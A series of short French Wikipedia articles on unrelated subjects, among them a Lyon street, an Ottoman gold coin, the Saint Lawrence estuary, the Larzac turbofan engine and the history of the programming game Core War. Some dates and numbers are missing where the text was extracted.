<doc id="2844235" url="https://fr.wikipedia.org/wiki?curid=2844235" title="Le Choix d'aimer (homonymie)">
Le Choix d'aimer (homonymie)

Le Choix d'aimer est le titre de plusieurs œuvres :

</doc>
<doc id="2844237" url="https://fr.wikipedia.org/wiki?curid=2844237" title="Rue de Gadagne">
Rue de Gadagne

La rue de Gadagne est une rue piétonne pavée du quartier du Vieux Lyon, dans le de Lyon, en France. Les bâtiments qui la bordent sont représentatifs des immeubles lyonnais de la période de la Renaissance.
Situation.
Son tenant septentrional est la rue de la Loge et son aboutissant, la place du Petit-Collège. Elle précède la rue du Bœuf.
Histoire.
Elle s'appelait autrefois la rue Pierre Vive, nom d'une vieille famille piémontaise installée à Lyon depuis 1492. Ses descendants firent construire entre 1511 et 1525 deux hôtels particuliers jumeaux qui devinrent des musées : le musée d'histoire de Lyon et le musée des arts de la marionnette. La fille de Nicolas Vive y tint au un brillant salon que fréquentèrent des artistes et des personnalités telles que Clément Marot, Maurice Scève ou Étienne Dolet.
En 1545, le frère de Marie vendit ces biens immobiliers à la famille "Gadagne", célèbre famille lyonnaise qui donna son nom à la rue. La rue Gadagne est attestée en 1614.
Édifices remarquables.
Les musées Gadagne : on y accède par la place du petit collège, par les anciennes écuries. Puis un escalier à vis dans une tour polygonale permet d'accéder aux trois étages des galeries.
L'intérieur est très intéressant puisqu'on peut y admirer :
L'accès principal de l'ensemble Gadagne est situé sur cette place ;

</doc>
<doc id="2844259" url="https://fr.wikipedia.org/wiki?curid=2844259" title="AEGON Center">
AEGON Center

Le AEGON Center est un gratte-ciel situé dans le quartier des affaires de Louisville, au 400 "West Market Street". 
Ce bâtiment de 35 étages mesure 167 mètres de haut, ce qui en fait le plus haut gratte-ciel du Kentucky depuis 1993. Il avait alors détrôné le National City Tower (156 m) construit en 1972.
Il fut dessiné par les architectes John Burgee et Philip Johnson. Son nom initial était "Capital Holding Center", puis "Providian Center". Le building est reconnaissable par son dôme de style roman. Le bâtiment possède une surface de de bureaux et de commerces.

</doc>
<doc id="2844260" url="https://fr.wikipedia.org/wiki?curid=2844260" title="Hispano">
Hispano

Hispano vient du latin "", qui veut dire espagnol. Aux États-Unis, le terme est souvent utilisé pour désigner les personnes originaires de l'Amérique hispanique et en Europe les personnes originaires d'Espagne. On retrouve ce terme dans :

</doc>
<doc id="2844262" url="https://fr.wikipedia.org/wiki?curid=2844262" title="Georges Toutain">
Georges Toutain

Georges Toutain est un ingénieur agronome français (il se définit lui-même comme agro-écologiste) né le à Fontenay-Torcy et mort le à Beauvais. Militant contre les pesticides, il est cofondateur, président puis président d’honneur du mouvement pour les droits et le respect des générations futures (MDRGF), nommé, depuis 2008, Générations Futures.
Biographie.
Après ses études à l’Institut national de la recherche agronomique (INRA), il passe 23 ans au Maghreb. Il rentre ensuite à Fontaine-Lavaganne pour développer son pré-verger en privilégiant la biodiversité (94 variétés de pommiers et 30 variétés de poirier) et sans pesticides. Dans un but informatif et éducatif, il y organise des portes ouvertes deux fois par an.
Il est aussi diplômé du Centre des hautes études sur l'Afrique et l'Asie modernes (CHEAM) de Paris, Fondation nationale des sciences politiques, et docteur en développement économique et social.
Georges Toutain a été membre de Génération écologie et a été élu conseiller régional de Picardie en 1992 sous cette étiquette. Vice-Président de la commission agricole de cette assemblée de 1992 à 1998, il y a impulsé une meilleure prise en compte de l'environnement, notamment un réseau de 16 fermes de référence agro-environnementale, coordonné par la chambre régionale d'agriculture, visant à réduire les produits phytopharmaceutiques.
Il s'est également présenté sous cette étiquette lors des élections législatives de 1997 dans la première circonscription de l'Oise, obtenant 3,19 % des suffrages exprimés.

</doc>
<doc id="2844267" url="https://fr.wikipedia.org/wiki?curid=2844267" title="Iakhroma">
Iakhroma

Iakhroma (en ) est une ville de l'oblast de Moscou, en Russie, dans le raïon Dmitrovski. Sa population s'élevait à habitants en 2014.
Géographie.
Iakhroma est arrosée par la rivière Iakhroma et se trouve à au nord de Moscou.
Histoire.
Iakhroma fut créée en 1841 comme une cité au service d'une usine textile de tissage, construite au bord de la rivière Iakroma. En 1901, une gare ferroviaire fut construite à proximité. Iakhroma accéda au statut de commune urbaine en 1928, puis à celui de ville en 1940.
Population.
Recensements (*) ou estimations de la population

</doc>
<doc id="2844268" url="https://fr.wikipedia.org/wiki?curid=2844268" title="Sultani (monnaie)">
Sultani (monnaie)

Le sultani (en ) est une ancienne monnaie d'or et une unité monétaire émise par l'Empire ottoman à partir du et jusqu'au milieu du . Les monnaies d'or ottomanes sont désignées de manière générique par le terme altun.
Étymologie et histoire.
Confronté aux nécessités du négoce en Méditerranée, l'Empire ottoman y affronte la république de Venise sur les plans militaires et commerciaux. Mehmet II signe en 1456 la création de nouveaux ateliers monétaires à Constantinople (juste conquise), Edirne et Serrès, dédiés non plus à la seule fabrication de l'akçe d'argent, mais d'une nouvelle unité comptable, une pièce d'or capable de rivaliser avec le "ducato d'oro" vénitien (appelé en français « sequin » de manière générique) ou le florin de Florence, deux monnaies reconnues dans tout le Bassin méditerranéen et en Europe continentale, pour leur stabilité et leur bon aloi. Il ne s'agit pas ici de copier la monnaie dominante mais de l'égaler : cette stratégie fut gagnante durant deux siècles. Les premières frappes répertoriées remontent à 1477-1478 (882 Hégire), à Constantinople, sous la tughra (seau) de Mehmet. Ces premières pièces sont appelées localement "sultani". Le poids moyen est de 3,572 g d'or d'un titrage pratiquement pur (0.997/1000). Le sultani va peu à peu s'imposer dans l'Empire, et succéder ainsi aux multiples formes monétaires en or dérivant du dinar.
Ces pièces ne portent aucune mention de leur valeur : c'est le marché qui détermine leur équivalence, ou éventuellement un décret impérial. Le cours va rester relativement stable par rapport à l'argent métal. Le pic de production des sultanis est atteint sous le règne (1520-1566) de Soliman le Magnifique, grâce à la découverte de nouvelles mines d'or dans les Balkans et à la conquête de l'Égypte, le grammage d'or est alors abaissé à 3,544 pour un équivalent de 60 akçes au change du marché officiel. Le cours se dégrade par rapport à l'argent métal au moment de la crise ou famine monétaire de la fin du . Au début du , les négociants commencent à se méfier du sultani, le cours de l'akçe s'effondre, et la qualité également. 
Le peuple, qui n'a pas accès à ce type de pièce réservé aux négociants et aux politiques, l'appelle "altun", ce qui veut dire « or, ou pièce en or ».
Les derniers sultanis sont frappés sous le règne de Mahmud (1730-1754).
Évolution et équivalence.
Le sultani est aussi dénommé "mahboub" aussi bien à Tripoli, qu'au Caire et à Alger. 
En Tunisie ottomane, elle est également une ancienne subdivision monétaire, avant l'adoption du rial tunisien. La valeur est de quatre 4,5 rials suivant l'évolution du cours légal. Vers 1831, son prix s'élève à cinq rials et sept huitièmes dans les changes de Tunis, à 6,25 francs dans ceux de Marseille, voire 6,85 francs, cours très faible qui s'explique par la mauvaise qualité des pièces et la méfiance du marché. Les demi-sultanis sont appelés "nouss mahboub" ou "nouss sultani". Les quarts sont appelés "roubou mahboub" ou "roubou sultani".
Cette pièce, parfois percée d'un petit trou, est utilisée de nos jours dans la bijouterie traditionnelle tunisienne sous la dénomination de "mahboub".

</doc>
<doc id="2844272" url="https://fr.wikipedia.org/wiki?curid=2844272" title="Liberté économique">
Liberté économique

La liberté économique est la capacité fondamentale qu'ont les membres d'une société de procéder entre eux à des échanges de nature économique. C'est un terme qui a des acceptions différentes, tant juridique (en tant que droit fondamental) qu'économique et politique. Une des approches principales de la liberté économique provient des traditions libérales classiques et libertariennes, qui se basent sur le libre marché, le libre-échange et la propriété privée.
Libre-échange.
Le point de vue libre-échangiste définit la liberté économique comme la liberté de produire, de commercer et de consommer des biens et services acquis sans usage de la force, de la contrainte ou du vol. Cette notion est incarnée dans un État de droit par le respect de la propriété privée et la liberté contractuelle et caractérisée par une ouverture aux marchés. Plusieurs indices mondiaux, comme le projet "" ou encore l'indice de liberté économique, tentent de mesurer la liberté économique des différents pays. D'après des études empiriques s'appuyant sur ces mêmes indices le niveau de vie, la croissance économique, l'absence de violence, de corruption et d'inégalité de revenu sont positivement corrélées au niveau de liberté économique.
Par pays.
Canada.
La liberté économique pourrait être traitée sous plusieurs aspects en droit canadien et québécois. Mais tout d'abord, il faut savoir que la notion générale de « liberté économique » n'est pas prévue dans les Chartes des droits et elle ne constitue pas une liberté constitutionnalisée en tant que telle. Cependant, le droit provincial ou le droit fédéral peut dans certaines circonstances reconnaître certaines composantes de la liberté économique, comme le droit aux biens, la liberté contractuelle et la liberté des échanges commerciaux. Mais chacune de ces composantes de la liberté économique peut elle-même être assujettie à des limites juridiques importantes.
Suisse.
En Suisse, la Constitution fédérale prévoit que « La liberté économique est garantie. Elle comprend notamment le libre choix de la profession, le libre accès à une activité économique lucrative privée et son libre exercice » (article 27).
La liberté économique s'applique aussi aux personnes morales. Cependant, l'État peut prendre « des mesures restrictives poursuivant des motifs d'ordre public, de politique sociale ou des mesures ne servant pas en premier lieu des intérêts économiques (par exemple, aménagement du territoire, politique environnementale) ».
Par exemple, la publicité pour le tabac ou l'alcool fort peut être interdite, car elle vise « un intérêt public prépondérant à la protection de la vie et de la santé ». Une ville peut également interdire l'affichage commercial en général, dans un but de politique sociale (réduction de l'exposition non désirée à la publicité et lutte contre la surconsommation).
France.
En 1842, Constantin Pecqueur considère que l'autorité d'une société, par sa hiérarchisation, conduit à renier la liberté économique individuelle ce que ne ferait pas une association. En 1843, Pierre Leroux considère que la révolution donna à la bourgeoisie la liberté économique du commerce et de l'industrie. En 1845, la liberté économique est considérée par certains comme la liberté de travailler.
En France, la liberté économique a longtemps été assimilée à la liberté du commerce et de l'industrie.
En droit français, la notion de liberté économique peut couvrir la liberté d'entreprendre, la liberté contractuelle, la liberté de circulation au sens économique ou la liberté d'établissement.
Union européenne.
En 2012, la liberté économique est invoquée par Schenker AG, société requérante d'Allemagne et la demanderesse Cathay Pacific Airways Ltd et la Commission européenne, défenderesse.
En 2016, la Cour de justice de l'Union européenne considère qu'une concession de services offre une certaine liberté économique au concessionnaire.
En 2016, dans l'affaire C‑562/15, Carrefour hypermarchés SAS contre ITM Alimentaire International SASU, la cour de justice considère que la Cour a notamment jugé que le choix du nombre de comparaisons auxquelles l’annonceur souhaite procéder entre les produits qu’il offre et ceux qu’offrent ses concurrents relève de la liberté économique de l’annonceur.
En 2017, la Cour de justice considère que les droits antidumping ou l'application d'un prix minimal en vertu d’un engagement sont des entraves à la liberté économique.

</doc>
<doc id="2844276" url="https://fr.wikipedia.org/wiki?curid=2844276" title="Sparrm.">
Sparrm.



</doc>
<doc id="2844278" url="https://fr.wikipedia.org/wiki?curid=2844278" title="Jean Ier d'Antioche">
Jean Ier d'Antioche

Jean d'Antioche est patriarche d'Antioche de 429 à 441-442.
Ancien élève de Nestorius, il le soutient contre saint Cyrille d'Alexandrie, le grand adversaire du nestorianisme. Son arrivée tardive au concile d'Éphèse permet à Cyrille de faire condamner Nestorius. Mais Jean riposte en organisant un contre-concile qui condamne Cyrille. 
La dispute est officiellement réglée en 433 par le "Symbole d'union" : Jean y admet la condamnation de Nestorius, ce qui le brouille avec certains évêques syriens comme Théodoret de Cyr. La querelle, nullement réglée, s'aiguise dans les années suivantes.

</doc>
<doc id="2844283" url="https://fr.wikipedia.org/wiki?curid=2844283" title="Ekebergia capensis">
Ekebergia capensis

Ekebergia capensis est une espèce de la famille des "Meliaceae".
C'est une espèce africaine. On la trouve notamment en Éthiopie, au Kenya, en Côte d'Ivoire, en Angola etc.
Elle est nommée en honneur à l'explorateur suédois Carl Gustaf Ekeberg, qui a parrainé les voyages du naturaliste et découvreur de l'espèce, Anders Sparrman en Afrique.

</doc>
<doc id="2844284" url="https://fr.wikipedia.org/wiki?curid=2844284" title="Ekebergia rueppelliana">
Ekebergia rueppelliana



</doc>
<doc id="2844286" url="https://fr.wikipedia.org/wiki?curid=2844286" title="Glucosinolates">
Glucosinolates



</doc>
<doc id="2844287" url="https://fr.wikipedia.org/wiki?curid=2844287" title="Aaron hadlow">
Aaron hadlow



</doc>
<doc id="2844288" url="https://fr.wikipedia.org/wiki?curid=2844288" title="American Le Mans Series 2007">
American Le Mans Series 2007

L'American Le Mans Series 2007 s'est déroulée du au sur un total de douze manches.
Résultats.
Les vainqueurs du classement général sont inscrits en caractères gras.
Classement écurie.
Pour toutes les courses (hormis les GP, en dessous), les points sont attribués aux 10 premiers dans l'ordre suivant :
Pour les 500 miles de Road America et les 4 heures de Monterey, les points sont attribués aux 10 premiers dans l'ordre suivant :
Et pour les 12 Heures de Sebring et le Petit Le Mans, les points sont attribués aux 10 premiers dans l'ordre suivant :
Les voitures qui ont complété moins 70 % de la course ne sont pas classées.
Classement pilotes.
Pour toutes les courses (hormis les GP, en dessous), les points sont attribués aux 10 premiers dans l'ordre suivant :
Pour les 500 miles de Road America et les 4 heures de Monterey, les points sont attribués aux 10 premiers dans l'ordre suivant :
Et pour les 12 Heures de Sebring et le Petit Le Mans, les points sont attribués aux 10 premiers dans l'ordre suivant :
Les voitures qui ont complété moins 70 % de la course ne sont pas classées.

</doc>
<doc id="2844290" url="https://fr.wikipedia.org/wiki?curid=2844290" title="Mickey Renaud">
Mickey Renaud



</doc>
<doc id="2844306" url="https://fr.wikipedia.org/wiki?curid=2844306" title="Estuaire du Saint-Laurent">
Estuaire du Saint-Laurent

L'estuaire du Saint-Laurent est l'embouchure du fleuve Saint-Laurent. Situé dans l'Est du Canada, il s'étend du lac Saint-Pierre à l'île d'Anticosti où il se déverse dans le golfe du Saint-Laurent. D'une longueur de , il est le deuxième plus long estuaire du monde, derrière celui de l'Amazone ().
Géographie.
L'estuaire du Saint-Laurent est subdivisé en trois sections : 
La proclamation royale de 1763 définit une ligne partant de la rivière Saint-Jean en passant par la pointe ouest de l'île d'Anticosti, jusqu'au cap des Rosiers, qui délimite la fin de l'estuaire du fleuve et le commencement du golfe du Saint-Laurent.
Caractéristiques physiques.
L'estuaire du Saint-Laurent est caractérisé par un front salin situé à la pointe est de l'île d'Orléans. La zone de contact entre l'eau douce et l'eau salée correspond à une région de fortes concentrations de matière en suspensions à l'origine d'une zone de turbidité maximale d'une longueur variant de 70 à 120 km, en fonction du courant du fleuve. Cette zone de turbidité maximale est située entre l'ile d'Orléans, où la salinité est supérieure à 0 PSU, et l'ile aux Coudres, où la salinité est inférieure à 10 PSU. Les mécanismes de circulation estuarienne associés à ce milieu en font un site privilégié de production primaire et secondaire qui abrite de nombreux sites d'alevinage des poissons. La forte turbidité du milieu procure un refuge contre les prédateurs tandis que les larves sont maintenues dans des conditions optimales de température et de salinité. Les variations importantes de salinité et turbidité entrainent une grande diversité des conditions physicochimiques et des communautés planctoniques sur le fleuve. 
Faune et flore.
Depuis 2002, le ministère des Forêts, de la Faune et des Parcs du Québec a entrepris la réintroduction du bar rayé ("Morone saxatilis") à partir de larves, de juvéniles et de reproducteurs issus de la rivière Miramichi au Nouveau-Brunswick. Bien qu'il s'agisse d'un projet d'ensemencement d'une nouvelle population de bars dans l'estuaire, le bar rayé était déjà présent au début du siècle dernier. La disparition de la population ancestrale de bar rayé dans les années 60 s'explique par les trop fortes pressions d'exploitation et la destruction de son habitat à cause de la construction de la voie maritime du Saint-Laurent. Depuis 2013, le ministère des Forêts, de la Faune et des Parcs a mis en place un suivi annuel des jeunes de l'année permettant de suivre le rétablissement de la nouvelle population. Le bar rayé est un poisson qui se déplace en banc, ce qui explique ces fréquentes mentions par les pêcheurs et la fausse idée que l'espèce serait très abondante dans le fleuve. La population de bar rayé du Saint-Laurent a été désignée «en voie de disparition» par le Comité sur la situation des espèces en péril au Canada et il demeure interdit de le pêcher dans l'estuaire du Saint-Laurent.
Le béluga du Saint-Laurent est une espèce emblématique de l'estuaire, mais bien d'autres espèces y sont présentes.
Dans un esprit de sciences citoyennes et de travail collaboratif, un recensement des poissons de l'estuaire est en cours, avec un guide d'identification téléchargeable.

</doc>
<doc id="2844310" url="https://fr.wikipedia.org/wiki?curid=2844310" title="Tarr">
Tarr

Tarr est un roman moderniste de Wyndham Lewis, écrit en 1914-1915 et publié d'abord en feuilleton dans "The Egoist" d'avril 1916 à novembre 1917. La version américaine fut publiée en 1918. Situé dans le milieu bohème du Paris d'avant-guerre, il nous montre deux artistes, l'Anglais Tarr et l'Allemand Kreisler, en train de se débattre dans des problèmes d'argent, de femmes et avec leur situation dans la société. Le roman abonde en thèmes quelque peu nietzschéens. Tarr, dont on pense généralement qu'il a été créé sur le modèle de Lewis lui-même, affiche son mépris pour les « bourgeois-bohèmes » qui l'entourent, et souhaite « se débarrasser de l'humour » qu'il considère, surtout sous sa forme anglaise, comme un « moyen de fuir la réalité » qui ne correspond pas à l'ambition et au monde moderne. Mais cette attitude de conscience de soi et les situations qu'elle entraîne sont, paradoxalement, une des sources principales de l'humour noir omniprésent dans le roman. Kreisler est un romantique allemand pétri de violence et d'une énergie protéiforme, il a échoué en tant qu'artiste, et à bien des égards, vole la vedette dans le roman. On voit une indication du caractère extrême et vivant de sa description dans le fait que Lewis quelques années plus tard se demandera s'il n'avait pas, en Kreisler, eu la prémonition d'Hitler. 
La première édition américaine contient un certain nombre de doubles traits d'union à barres obliques (qui ressemblent à un signe égal, '='). On a soutenu qu'il s'agissait d'une tentative de Lewis, un artiste, pour introduire des « touches picturales » dans la littérature. Supposition contredite toutefois par John Constable, qui a démontré que ce n'est rien de plus qu'un signe de ponctuation allemand que Lewis avait adopté un bref moment. 
Lewis révisa le roman (comme il le fit pour quelques-unes de ses premières œuvres), à l'occasion d'une nouvelle édition en 1928 ; il y ajouta un nouveau personnage, un juif, présenté sous un jour antisémite, et il modifia de nombreux passages qui peuvent être considérés comme meilleurs dans le roman primitif.

</doc>
<doc id="2844316" url="https://fr.wikipedia.org/wiki?curid=2844316" title="Chogoria">
Chogoria

Chogoria est une ville de la province orientale du Kenya, à quelques dizaines de kilomètres au sud de l'équateur et à 225 kilomètres de Nairobi, sur la route entre Meru et Embu.

</doc>
<doc id="2844317" url="https://fr.wikipedia.org/wiki?curid=2844317" title="Anser cygnoides orientalis">
Anser cygnoides orientalis



</doc>
<doc id="2844318" url="https://fr.wikipedia.org/wiki?curid=2844318" title="Abo de Tbilissi">
Abo de Tbilissi

Abo de Tbilissi ou Saint Abo ou Habo (en géorgien : აბო თბილელი, ჰაბო ტფილელი) né vers 756, mort en 786, est un jeune arabe chrétien, venu à Tbilissi en Géorgie depuis Bagdad comme esclave, qui mourut martyr des musulmans.
Histoire et tradition.
Né à Bagdad, Abo faisait partie des gardes musulmans du chef ibère du Kartli, Nersé, emprisonné dans la capitale abbasside par le calife Abdullah. Renvoyé chez lui avec certains honneurs, après trois ans de prison, Nersé appréciait son jeune "serviteur" pour sa science des parfums et des aromates. Mais il connaissait aussi le Coran et les lettres arabes, et il apprit à Tbilissi à écrire et à parler géorgien. Bientôt, il commença à lire la Bible et à prier le Christ, mais il n'osait rien dire ouvertement, par crainte des musulmans.
Quand Nersé se réfugia chez les Khazars, fuyant à nouveau la colère des Arabes, Abo l'accompagna au pays de Magog dans le nord du Caucase. Là il se prépara au baptême, qu'il reçut un peu plus tard en Abkhazie, dans l'Ouest près de la mer Noire. Quand Nersé revint au Kartli, Abo voulut accompagner son maître. Il fut alors exécuté comme renégat, en application de la loi islamique, le .
Saint Abo est fêté le 6 janvier (en Orient ?), le 8 janvier (en Occident ?), le dans le calendrier de l'Église de Jérusalem.

</doc>
<doc id="2844320" url="https://fr.wikipedia.org/wiki?curid=2844320" title="Hobson">
Hobson

Hobson désigne :

</doc>
<doc id="2844324" url="https://fr.wikipedia.org/wiki?curid=2844324" title="HOK Sport">
HOK Sport



</doc>
<doc id="2844325" url="https://fr.wikipedia.org/wiki?curid=2844325" title="Lucien Montet">
Lucien Montet



</doc>
<doc id="2844329" url="https://fr.wikipedia.org/wiki?curid=2844329" title="John Cox Dillman Engleheart">
John Cox Dillman Engleheart

John Cox Dillman Engleheart (1782/84 - 1862) est un miniaturiste anglais du . Il est le neveu et l'élève de George Engleheart (1752-1829).
Biographie.
John Engleheart vient se former dans l'atelier de son oncle dès l'âge de quatorze ans.
En 1801, il expose 157 œuvres à l'Académie royale. Son travail est propre, méticuleux, qui lui vaut une certaine notoriété à l'époque. Malheureusement, des revers de santé le contraignent d'abandonner la carrière à l'âge de 44 ans.
Il habite un certain temps "Thunbridge Wells" et décède en 1862, à l'âge de soixante huit ans.
Bibliographie.
"George Engleheart", G.C. Williamson and H.L.D. Engleheart (1902).

</doc>
<doc id="2844332" url="https://fr.wikipedia.org/wiki?curid=2844332" title="Clássico Vovô">
Clássico Vovô

Clássico Vovô, ou "O vovô de todos os clássicos" (« le grand-père de tous les classiques » en français) est le nom donné au Brésil au derby de Rio de Janeiro entre les équipes du Botafogo de Futebol e Regatas et du Fluminense Football Club. Il s'agit du plus vieux « classique » du Brésil, le premier ayant eu lieu le (victoire de Botafogo par 4 buts à 0).

</doc>
<doc id="2844338" url="https://fr.wikipedia.org/wiki?curid=2844338" title="Snecma-Turbomeca Larzac">
Snecma-Turbomeca Larzac

Le Larzac est un petit turboréacteur double corps double flux sans postcombustion. Il est fabriqué par le consortium GRTS composé de Snecma et Turbomeca. Il équipe divers appareils dont une majorité d'avions d'entraînement avancé ou d'appui léger tels que le Dassault/Dornier Alpha Jet, le HAL HJT-36 Sitara ou le MiG-AT.
Historique.
Le premier prototype du Larzac était un turboréacteur d'une tonne de poussée, destiné à équiper une large gamme d'appareils et visant principalement le marché civil. Il effectua ses premiers essais en mai 1969 ; ses premiers essais en vol eurent lieu en mars 1971, il était alors placé dans une nacelle attachée sous l'aile d'un Lockheed Constellation. Entre-temps, le marché ciblé changea visant maintenant celui des jets militaires d'entraînement, GRTS conçut à cet effet le Larzac 04. Une version civile, désignée Larzac 03, fut aussi développée visant notamment la motorisation du jet d'affaires Aérospatiale Corvette, mais le Pratt &amp; Whitney JT15D fut préféré à celle-ci.
En février 1972, le Larzac 04 fut sélectionné pour motoriser le biréacteur d'entraînement franco-allemand Alpha Jet. Pour ce programme, le groupe GRTS constitué des deux entreprises françaises doit partager les tâches avec deux entreprises allemandes, MTU et KHD. Ainsi les différentes tâches, telles que la fabrication des prototypes et leurs tests, furent réparties entre les quatre compagnies. La production des réacteurs de série et leurs essais furent eux aussi repartis entre les deux pays.
Plus tard, quand la Belgique commanda des Alpha Jet, l'assemblage et les essais des réacteurs correspondants furent assurés par FN (devenu Techspace Aero en 1992 puis Safran Aero Boosters en 2016). Finalement, le partage des tâches s'établit ainsi : 29,4 % pour Turbomeca, 23 % pour Snecma, 22,6 % pour MTU, 22 % pour KHD et 4 % pour FN. Aujourd'hui, le seul constructeur du Larzac est la filiale de Safran : Turbomeca-Snecma.
Description.
Le Larzac est un turboréacteur double corps double flux dépourvu de postcombustion. Il est de conception modulaire, comme une majorité des réacteurs construits par Snecma, permettant ainsi un entretien plus facile. Ces différents modules sont :
Il s'agit d'un simple canal en aluminium dépourvu d'ailettes de guidage du flux.
Le compresseur est composé de deux étages. Son taux de dilution est de 1,13 sur la version 04-C6 et de 1,04 sur la 04-C20.; son flux d'air est /s sur la 04-C6 et /s sur la 04-C20.
Ce compresseur est composé de quatre étages. La pression en sortie est de 10,5 sur la 04-C6 et 11,1, sur la 04-C20.
La chambre est de type annulaire. La température en entrée de turbine est de pour la version 04-C6 et de pour la 04-C20.
Elle n'est composée que d'un étage et est reliée par un arbre au compresseur haute pression.
Elle n'est composée que d'un étage et entraîne grâce à un arbre le compresseur basse pression.
Il canalise les flux d'air provenant des turbines (flux principal) et du compresseur basse pression (flux secondaire), mais n'est pas doté de mélangeur.
Il est de type hydro-mécanique et est assisté d'un ordinateur.
Elle est composée de différents équipements dont une boîte de vitesses pour redistribuer l'énergie, de carters d'huile...
Versions.
Larzac 03.
Projet de réacteur visant à propulser des jets d'affaires dont l'Aérospatiale Corvette, cependant il ne fut jamais produit.
Larzac 04-C6.
Le Larzac 04-C6 est le réacteur de base des Alpha Jet. Il commença ses essais sur banc en , puis en nacelle sous un Lockheed Constellation en et sur Falcon 10 à partir de juillet 1973. Le premier vol de l'Alpha Jet eut lieu le et le moteur fut certifié en mai 1975. Une licence fut accordée à Teledyne CAE (aujourd'hui TCM Turbine Engines) aux États-Unis pour produire le Larzac sous le nom Model 490-04, mais faute de clients aucun ne fut construit.
Larzac 04-C20.
Le Larzac 04C-20 est une version plus puissante dotée d'un flux d'air et d'une température en entrée de turbine accrus. Les premiers essais eurent lieu en mars 1982 et les premiers essais en vol en décembre de la même année. Un petit nombre de réacteurs furent produits jusqu'en décembre 1984, afin de rééquiper les Alpha Jet de la Luftwaffe et les prototypes des versions suivantes.
Larzac 04-H20.
Le Larzac 04-H20 est une version dérivée du 04-C20. Celui-ci est destiné à propulser l'avion d'entraînement monoréacteur indien HAL HJT-36 Sitara. Le premier des deux prototypes, équipé de son turboréacteur Larzac, a commencé ses essais en vol le . Cependant, en avril 2004, il a été rapporté que les appareils de série seront équipés de réacteurs russes Lyul'ka Saturn AL-55I moins chers mais impliquant un retard dans le développement de l'appareil.
Larzac 04-R20.
La version 04-R20 du Larzac est dérivée du 04-C20. Elle est destinée à propulser le biréacteur d'entraînement avancé russe MiG-AT qui effectua son premier vol en mars 1996. Une commande de cinq réacteurs visant à équiper les deux prototypes fut suivi de dix autres. Ces commandes furent suivies à la fin 1997 d'une autre portant sur vingt moteurs. Il fut aussi prévu que le Larzac 04-R20 soit produit sous licence par Chernyshov. Cependant l'industrie russe se mit à développer son propre moteur, le TMKB Soyouz RD-1700, pour cet appareil. Malgré tout, il semble que le contrat n'ait pas été remis en cause par le rejet de l'appareil par l'aviation russe et en , il est annoncé que RSK-MiG était sur le point de signer avec l'Algérie un contrat d’un milliard de dollars américains portant sur l'acquisition de 80 appareils ; cependant un rapport ultérieur annonça qu'ils seraient équipés de moteurs russes RD-1700, moins chers.
Larzac 04-U3.
Projet de réacteur développé conjointement par GRTS et la firme russe Klimov visant à fournir un réacteur plus puissant pour motoriser le MiG-AT.
Larzac 04-V3.
Projet de réacteur visant à propulser l'avion polonais PZL-Mielec M-95 Iryda. Projet annulé en 1997.
État de la production.
Les Larzac 04-C6 et 04-C20 ont été produits jusqu'en 1988, soit un total de . Ils sont ou ont été utilisés par 13 armées de l'air et gouvernements :
... et par des opérateurs privés utilisant des Alpha Jet :
À la fin 1996, le temps d'utilisation cumulé des réacteurs atteignait , au début 2007, il atteignait de vol. A cette date , étaient encore en service. L'armée de l'air française a retiré ses Alphajet de formation en 2023 mais conserve ceux destiné à la Patrouille de France et aux rôles de plastron. Ils seront retirés au maximum en 2035

</doc>
<doc id="2844339" url="https://fr.wikipedia.org/wiki?curid=2844339" title="Core War">
Core War

Core War est un jeu de programmation dans lequel deux programmes informatiques (ou plus) sont en concurrence pour le contrôle d'une machine virtuelle appelée "MARS", pour "Memory Array Redcode Simulator". Ces programmes sont écrits dans un langage d'assemblage appelé Redcode. Le but du jeu est de faire se terminer toutes les instances des programmes adverses, afin d'être le dernier à s'exécuter.
Histoire.
L'idée de Core War provient de Creeper et Reaper, les premiers vers informatiques créés au début des années 1970 par Bob Thomas et Ray Tomlinson. Le jeu faisait à l'origine partie d'un jeu appelé "Darwin", et développé par Victor A. Vyssotsky, Robert Morris Sr. et M. Douglas McIlroy aux Bell Labs dans les années 1960. Le terme "core" dérive de la technologie de mémoire à tores de ferrite utilisée à l'époque, et appelée en anglais "magnetic core memory". Le terme de jargon informatique "core dump" a la même origine.
La première description du langage Redcode a été publiée en .
Le jeu fut présenté au public en , dans un article écrit par Dewdney et publié dans "Scientific American".
Dewdney traita à nouveau de Core War en 1985 (article intitulé "Computer Recreations", "récréations informatiques"), et à nouveau en 1987.
Une International Core Wars Society (ICWS, en français « société internationale [du jeu] "Core War" ») fut fondée en 1985, un an après l'article original de Dewdney. Cette société publia de nouvelles normes pour le langage Redcode en 1986 et 1988, et proposa une nouvelle version en 1994 qui ne fut jamais réellement officialisée. Cependant, en 1994 la version provisoire fut adoptée et étendue, et constitue le standard "de fait" de nos jours. L'ICWS fut dirigée par Mark Clarkson de 1985 à 1987, puis par William R. Buckley de 1987 à 1992, et enfin par Jon Newman à partir de 1992. Actuellement, l'ICWS n'existe plus.
En 1991, un newsgroup consacré à Core War fut créé. Aujourd'hui, cela reste la source la plus riche d'informations sur Core War. La plupart des articles et des lettres d'information sur Core War sont parus dans ce newsgroup.

</doc>
<doc id="2844344" url="https://fr.wikipedia.org/wiki?curid=2844344" title="Reinecker">
Reinecker

Reinecker est un nom de famille germanophone porté notamment par :

</doc>
<doc id="2844346" url="https://fr.wikipedia.org/wiki?curid=2844346" title="Billy the kick">
Billy the kick



</doc>
<doc id="2844347" url="https://fr.wikipedia.org/wiki?curid=2844347" title="Peter Burton">
Peter Burton

Peter Burton est un acteur britannique né le à Bromley (Angleterre) et mort le à Londres.
Il était le premier acteur à interpréter le rôle de Q dans James Bond. Burton était indisponible pour reprendre son rôle dans "Bons Baisers de Russie" et fut remplacé par Desmond Llewelyn qui a joué le rôle jusqu'à sa mort (1999).

</doc>
<doc id="2844354" url="https://fr.wikipedia.org/wiki?curid=2844354" title="Giovanni Durando">
Giovanni Durando

Giovanni Durando (né le à Mondovì, dans la province de Coni, au Piémont et mort le à Florence) est un général italien du qui combattit pour l'unification de l'Italie. Il est le frère de Giacomo Durando et de Marc-Antoine Durando.
Biographie.
Dans les années 1830-1831, Giovanni Durando est parmi les fondateurs, avec son frère Giacomo, Bersani, Brofferio et Ribotti, d’une association secrète patriotique d'inspiration maçonnique, les « » ("Cavalieri della libertà").
En 1848, il commande les troupes pontificales contre les Autrichiens pendant la première guerre d'indépendance qui est l'une des étapes essentielles du Risorgimento ayant conduit à l'unification de l'Italie. En 1859 et 1866, il combat en tant que général de l'armée italienne.
En 1868, alors qu'il est aide camp de Victor-Emmanuel II de Savoie et sénateur, il devient chevalier de l'ordre de l'Annonciade.

</doc>
